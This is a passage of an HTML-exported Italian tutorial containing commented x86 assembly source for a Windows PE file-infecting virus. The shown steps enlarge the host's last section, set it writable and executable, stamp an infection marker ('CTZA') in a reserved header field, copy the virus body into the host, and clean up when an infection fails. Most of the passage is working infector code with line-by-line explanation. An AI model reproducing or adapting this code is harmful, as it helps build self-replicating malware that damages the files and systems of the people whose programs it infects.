mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; essa
l’indirizzo VA Address: così abbiamo in EAX il nuovo EIP per l’host-disco. Quindi
scriviamo tale <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; valore nel PE
header dell’host-disco, e in un’altra variabile.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,[esi+10h]<span style="mso-spacerun:
yes">                   </span>; EAX = nuovo SizeOfRawData<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>add<span style="mso-spacerun: yes">    
</span>eax,virus_size<span style="mso-spacerun: yes">                  </span>;
EAX = EAX+VirusSize<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>ecx,[edi+3Ch]<span
style="mso-spacerun: yes">                   </span>; ECX = FileAlignment<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>Align<span
style="mso-spacerun: yes">                           </span>; Allinea<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">    
</span>[esi+10h],eax<span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">              </span>; Nuovo SizeOfRawData<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>[esi+08h],eax<span style="mso-spacerun:
yes">                   </span>; Nuovo VirtualSize<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pop<span style="mso-spacerun:
yes">     </span>edx<span style="mso-spacerun:
yes">                             </span>; EDX = puntatore Raw alla fine<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">                                               
</span>;<span style="mso-spacerun: yes">       </span>della sezione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,[esi+10h]<span style="mso-spacerun:
yes">                   </span>; EAX = Nuova SizeOfRawData<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>add<span style="mso-spacerun: yes">    
</span>eax,[esi+0Ch]<span style="mso-spacerun: yes">                   </span>;
EAX = EAX+VirtualAddress<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>mov<span style="mso-spacerun: yes">     </span>[edi+50h],eax<span
style="mso-spacerun: yes">                   </span>; EAX = Nuovo SizeOfImage<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>or<span style="mso-spacerun: yes">      </span>dword ptr [esi+24h],0A0000020h<span
style="mso-spacerun: yes">  </span>; inserisce i nuovi flag di sezione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 13) ALLINEA I
VALORI; MODIFICA I FLAG DELL’ULTIMA SEZIONE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Per prima cosa
carichiamo in EAX la SizeOfRawData dell’ultima sezione, e poi ad essa la misura
del <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; virus. In ECX
carichiamo il FileAlignment, chiamiamo la funzione 'Align' function, così in
EAX <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; avremo il
valore allineato di SizeOfRawData+VirusSize.<span style="mso-spacerun:
yes">                           </span><span style="mso-spacerun:
yes">          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Esempio:<span
style="mso-spacerun: yes">                                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun:
yes">                                                                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">      </span>SizeOfRawData - 1234h<span
style="mso-spacerun: yes">                                              
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">      </span>VirusSize<span style="mso-spacerun:
yes">     </span>-<span style="mso-spacerun: yes">  </span>400h<span
style="mso-spacerun: yes">                 </span><span style="mso-spacerun:
yes">                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">      </span>FileAlignment -<span
style="mso-spacerun: yes">  </span>200h<span style="mso-spacerun:
yes">                                               </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun:
yes">                                                                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Così,
SizeOfRawData più VirusSize sarà 1634h, e dopo l’allineamento diventerà 1800h. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Così abbiamo il
valore allineato della nuova SizeOfRawData e la nuova VirtualSize. In questo
modo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; non avremo
problemi.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Dopo di questo
calcoliamo la nuova SizeOfImage, che è sempre la somma della nuova
SizeOfRawData <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; e di
VirtualAddress. Quindi mettiamo tale valore nel campo SizeOfImage del PE header
(offset 50h).<span style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Infine dobbiamo
settare gli attributi della sezione di cui abbiamo aumentato le dimensioni. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Consideriamo le
seguenti le voci:<span style="mso-spacerun:
yes">                                      </span><span style="mso-spacerun:
yes">                                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:FR'>;<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:FR'>;<span style="mso-spacerun: yes">     
</span>00000020h - Section contains code<span style="mso-spacerun:
yes">                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes">     
</span>40000000h - Section is readable<span style="mso-spacerun:
yes">                                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes">     
</span>80000000h - Section is writable<span style="mso-spacerun:
yes">                           </span><span style="mso-spacerun:
yes">          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun:
yes">                                                                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Noi applichiamo
a questi tre valori un’operazione di OR operation; il risultato sarà A0000020h.
<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Così abbiamo in
OR anche gli attributi correnti, che non vogliamo cancellare.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>dword ptr [edi+4Ch],&quot;CTZA&quot;<span style="mso-spacerun:
yes">      </span>; mette il marcatore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lea<span style="mso-spacerun:
yes">     </span>esi,[ebp+aztec]<span style="mso-spacerun:
yes">                 </span>; ESI = Ptr a virus_start<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xchg<span style="mso-spacerun:
yes">    </span>edi,edx<span style="mso-spacerun: yes">                        
</span>; EDI = Raw ptr dopo l’ultima sezione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>edi,dword ptr [ebp+MapAddress]<span style="mso-spacerun:
yes">  </span>; EDI = puntatore normalizzato<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes">    
</span>ecx,virus_size<span style="mso-spacerun: yes">                  </span>;
ECX = bytes da copiare<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">   </span></span></b><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>rep<span
style="mso-spacerun: yes">     </span>movsb<span style="mso-spacerun:
yes">                           </span>; copia il virus<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'>jmp<span style="mso-spacerun: yes">    
</span>UnMapFile<span style="mso-spacerun: yes">                       </span>;
Unmap, close, etc.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">  </span>14) COPIA IL VIRUS<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; nella prima
lineainseriamo la marcatura di infezione in un campo non utilizzato del PE
header (offset<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">  </span>4Ch, che sarebbe 'Reserved1'), per impedire
di infettare nuovamente il file. Quindi mettiamo in ESI<span
style="mso-spacerun: yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; un puntatore
all’inizio del codice virale. Poi mettiamo in EDI il valore che avevamo in EDX <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; (ricordiamo
che: EDX = vecchia SizeOfRawData + PointerToRawData) <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Questo è il RVA
dove noi inseriremo il codice virale. Come indicato, è un RVA, che deve essere <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; cambiato in VA.
Questo è fatto aggiungendo il valore su cui si basa il RVA. Esso è relativo
all’indirizzo<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; dove ha inizio
la mappatura del file (se ricordiamo, è il valore di ritorno della funzione API
<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; MapViewOfFile).
Così finalmente abbiamo in EDI il VA dove scrivere il codice virale. In ECX <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; carichiamo la
misura del virus, e copiamo il codice virale nell’ultima sezione.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>NoInfect:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>dec<span style="mso-spacerun:
yes">     </span>byte ptr [ebp+infections]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>ecx,dword ptr [ebp+WFD_nFileSizeLow]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>TruncFile<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Arriviamo a
questo punto se durante l’infezione<span style="mso-spacerun: yes">  </span>si
sono avuti errori. Decrementiamo il contatore di <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; infezione e
tronchiamo il file alla misura che aveva prima dell’infezione.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------</span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>UnMapFile:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr
[ebp+MapAddress]<span style="mso-spacerun: yes">      </span>; Chiusura<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_UnmapViewOfFile]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>CloseMap:<span style="mso-spacerun: yes">      
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
